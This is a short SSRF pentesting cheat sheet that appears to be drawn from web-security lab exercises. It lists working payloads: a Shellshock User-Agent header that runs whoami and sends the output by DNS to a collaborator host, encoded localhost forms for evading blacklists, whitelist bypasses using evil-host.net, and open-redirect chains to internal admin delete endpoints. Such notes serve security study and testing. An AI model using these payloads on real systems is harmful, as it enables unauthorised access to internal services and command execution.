---
description: The website server make HTTP requests to the attacker domain.
cover: https://www.plexal.com/wp-content/uploads/2023/05/MicrosoftTeams-image-171.png
coverY: 0
---

# SSRF

Server side request forgery Induce the server-side application to make HTTP requests to an random domain of the attacker's choosing.

## <mark style="color:red;">Exploiting</mark>

### <mark style="color:yellow;">SSRF against the server itself</mark>

Attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface for example: http://localhost/admin.

### <mark style="color:yellow;">SSRF against other back-end systems</mark>

Attacker can exploit the SSRF vulnerability to access the other interface by submitting a internal HTTP request (EX: http://192.168.1.105/admin).

### <mark style="color:yellow;">Blind SSRF vulnerabilities</mark>

Response from the back-end request is not returned in the application's front-end response.

#### <mark style="color:purple;">**Find vulnerability:**</mark>

Observe a DNS look-up for the supplied Burp Collaborator domain.

#### <mark style="color:purple;">**Example (Blind SSRF with Shellshock exploitation):**</mark>

```http
GET /path TTP/1.1
Host: test.net
...
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).aaabbbcccdddeeefff.burpcollaborator.net
...
Referer: http://192.168.0.1:8080
Upgrade-Insecure-Requests: 1
Connection: close
```

## <mark style="color:red;">Bypass</mark>

### <mark style="color:yellow;">Bypass blacklist-based</mark>

#### <mark style="color:purple;">Change "127.0.0.1" to:</mark>

```http
http://2130706433
http://017700000001
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://0x7f000001
http://2130706433
http://017700000001
http://[::]:80
```

* Registering your own domain name that resolves to 127.0.0.1. You can use "spoofed.burpcollaborator.net" for this purpose.
* Obfuscating blocked strings using URL encoding or case variation.&#x20;

#### <mark style="color:purple;">Example:</mark>

```http
value=http://127.1/%25%36%31dmin/delete?username=carlos
```

### <mark style="color:yellow;">Bypass whitelist-based</mark>

* Using "@" char `https://expected-host@evil-host.net`
* Using "#" char `https://evil-host#expected-host.net`
* Create a invalid domain `https://expected-host.evil-host.net`
* Use URL-encode characters to confuse the URL-parsing code `http://localhost:80%2523@evil-host.net/admin`

### <mark style="color:yellow;">Bypassing SSRF filters via open redirection</mark>

<mark style="color:purple;">**Example 1:**</mark>

/product/nextProduct?currentProductId=6\&path=http://192.168.0.68/admin

<mark style="color:purple;">**Example 2:**</mark>

If "/product/stock" vulnerable to SSRF and "/nextProduct" vulnerable to OpenRedirect, Then:

```http
// HTTP request

POST /product/stock vulnerable/1.1
Host: test.net
......
Connection: close

api=/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
